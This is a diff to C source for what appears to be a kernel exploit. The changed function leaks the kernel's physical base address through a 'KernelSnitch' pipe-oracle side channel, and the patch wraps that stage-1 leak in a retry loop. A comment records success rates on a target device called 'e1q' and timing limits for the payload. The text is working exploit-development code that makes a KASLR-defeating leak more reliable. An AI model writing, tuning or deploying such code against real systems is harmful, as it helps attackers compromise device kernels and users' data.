@@ -1061,10 +1061,45 @@ int app_trigger_fops_slide_route(void) {
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  /*
+   * Stage-1 (pipe oracle) KernelSnitch leak is the gatekeeper: on e1q it
+   * succeeds only ~20-40% per try (run 20260810-200258: 15/24 attempts died
+   * at "pipe page child did not report base"; 20260810-202406: 4/5).  Run
+   * 20260810-202406 also confirmed stage-1 is fast (elapsed_ms=5435) and the
+   * whole payload is killed (137) by an external wall-clock cap at ~45-60s,
+   * so only the first 1-2 attempts can reach the gate.  Retrying stage-1 a
+   * few times inside the attempt (3 x ~5.4s + stage-2 ~10s ~= 27s, within the
+   * 45s p0 timeout) lifts the per-attempt stage-1 success to ~66% instead of
+   * aborting the whole attempt on the first miss.  reset_pipe_attempt() fully
+   * cleans the child/drain/reclaim fds between tries.
+   */
+#ifdef APP_P0_PIPE_ORACLE_ATTEMPTS
+  const int pipe_oracle_attempts = APP_P0_PIPE_ORACLE_ATTEMPTS;
+#else
+  const int pipe_oracle_attempts = 3;
+#endif
+  int pipe_oracle_ok = 0;
+  for (int pipe_try = 1; pipe_try <= pipe_oracle_attempts; pipe_try++) {
+    if (prepare_p0_pipe_oracle()) {
+      pipe_oracle_ok = 1;
+      break;
+    }
+    pr_warning("p0 pipe oracle stage-1 try=%d/%d failed\n",
+               pipe_try, pipe_oracle_attempts);
+    reset_pipe_attempt();
+    usleep(200000);
+  }
+  if (!pipe_oracle_ok) {
+    pr_error("p0 physical pipe preparation failed\n");
+    return 0;
+  }
+#else
   if (!prepare_p0_pipe_oracle()) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_SLIDE_FRESH_PAGE_ATTEMPTS
   const int fresh_page_attempts = APP_SLIDE_FRESH_PAGE_ATTEMPTS;
